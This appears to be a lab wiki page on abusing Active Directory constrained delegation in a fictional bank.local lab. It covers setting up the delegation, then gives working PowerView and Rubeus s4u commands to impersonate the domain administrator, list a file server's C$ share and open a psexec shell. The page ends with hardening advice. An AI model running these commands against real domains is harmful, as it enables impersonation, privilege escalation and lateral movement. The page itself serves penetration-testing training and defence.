---
description: >-
  If a user or computer has constrained delegation configured, it's possible to
  impersonate any domain user and authenticate to a service that the user
  account is trusted to delegate to. It is also poss
---

# Constrained Delegation

## Configuring

### Prerequisite&#x20;

User `sa_transfer` creation from:

{% content-ref url="../acl-abuses/forcechangepassword.md" %}
[forcechangepassword.md](../acl-abuses/forcechangepassword.md)
{% endcontent-ref %}

### Configuring

1. Login on `DC02` with the username `Administrator` and password `Welcome01!`.
2. Open PowerShell and execute the following command to set a SPN for the user sa\_transfer:

```
setspn -A HTTP/FILE01.amsterdam.bank.local amsterdam\sa_transfer
```

![](<../../../.gitbook/assets/image (55).png>)

3\. Open the "Active Directory Users and Computers" administration tool on `DC02`.

![](<../../../.gitbook/assets/image (37).png>)

4\. Open the "Users" directory and right click the `sa_transfer` user and select "Properties".

5\. Open the "Properties" tab and select "Trust this user for delegation to specified services only". Then click "Use any authentication protocol" and select "Add".

![](<../../../.gitbook/assets/image (60).png>)

6\. Select "Users or Computers" and type `FILE01` and click "Check Names" and "OK".

![](<../../../.gitbook/assets/image (11).png>)

7\. Select the "cifs" service and click on "OK". Click on "Apply" and "OK" and the delegation is configured.

![](<../../../.gitbook/assets/image (58) (1).png>)



## Attacking

### How it works

If a user or computer has constrained delegation configured, it's possible to impersonate any domain user and authenticate to a service that the user account is trusted to delegate to. It is also possible to create tickets for other services since they aren't checked.

### Tools

* [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)
* [Rubeus](https://github.com/GhostPack/Rubeus)
* [Psexec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec)

### Executing the attack

1. Login to `WS01` as Richard with the password `Sample123`.
2. Start PowerShell and download and execute an amsi and PowerView in memory:

![](<../../../.gitbook/assets/image (16) (1).png>)

3\. Execute the following query to enumerate all users with constrained delegation and select the samaccountname and msds-allowedtodelegateto attributes.

```
Get-DomainUser -TrustedToAuth | select samaccountname, msds-allowedtodelegateto
```

![](<../../../.gitbook/assets/image (73).png>)

4\. The user `sa_transfer` can delegate access to `cifs\FILE01.amsterdam.bank.local`. To abuse this we need access to the user, luckily we could reset the password earlier.

{% content-ref url="../acl-abuses/forcechangepassword.md" %}
[forcechangepassword.md](../acl-abuses/forcechangepassword.md)
{% endcontent-ref %}

5\. First we need to calculate the hash of the user, for this we can use Rubeus, using the following command:

```
.\Rubeus.exe hash /password:'2i^t#fFpL' /user:sa_transfer /domain:amsterdam.bank.local
```

![](<../../../.gitbook/assets/image (76) (1) (1).png>)

6\. The next step is too request a TGT and then request two service tickets for CIFS, HOST and RPCSS. So we can interact with the file system and psremoting for the fileserver. The easiest way to do this is using Rubeus.

```
.\Rubeus.exe s4u /user:sa_transfer /rc4:58A0D6C796769B84609E5F68C2213F96 /impersonateuser:administrator /domain:amsterdam.bank.local /msdsspn:cifs/FILE01.amsterdam.bank.local /altservice:CIFS,HOST,RPCSS /file01.amsterdam.bank.local /ptt
```

{% hint style="info" %}
* Possbible alt services:&#x20;
  * CIFS for directory browsing
  * HOST and RPCSS for WMI
  * HOST and HTTP for PowerShell Remoting/WINRM
  * LDAP for dcsync
* Another thing to keep in mind is that you can impersonate any user except those in groups "Protected Users" or accounts with the "This account is sensitive and cannot be delegated" right.
{% endhint %}



![](<../../../.gitbook/assets/image (54) (1).png>)

7\. When we list our tickets now we can see that we have three service tickets:

![](<../../../.gitbook/assets/image (48) (1).png>)

8\. Since we have a CIFS ticket we can list the `C` drive of the fileserver `FILE01`:

```
ls \\file01.amsterdam.bank.local\c$
```

![](<../../../.gitbook/assets/image (27).png>)

9\. We are unable to use the RPC and HOST tickets for pssession since the target server doesn't have it enabled. We can get a shell with the CIFS ticket by using psexec from sysinternals:

```
.\psexec64.exe \\file01.amsterdam.bank.local cmd.exe
```

![](<../../../.gitbook/assets/image (75) (1).png>)

## Defending

### Recommendations

* Tightly secure and monitor the user of AD objects with delegation set.
  * Set strong passwords and rotate them periodically.
  * Limit logons to systems.
  * Harden the systems these accounts are used.
* Add the flag "this account is sensitive and cannot be delegated"
* Add all high privileged accounts to the protected users group.

{% content-ref url="../../../defence/hardening/protected-users-group.md" %}
[protected-users-group.md](../../../defence/hardening/protected-users-group.md)
{% endcontent-ref %}

### Detection



## References

{% embed url="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1" %}

{% embed url="https://github.com/GhostPack/Rubeus" %}

{% embed url="https://docs.microsoft.com/en-us/sysinternals/downloads/psexec" %}
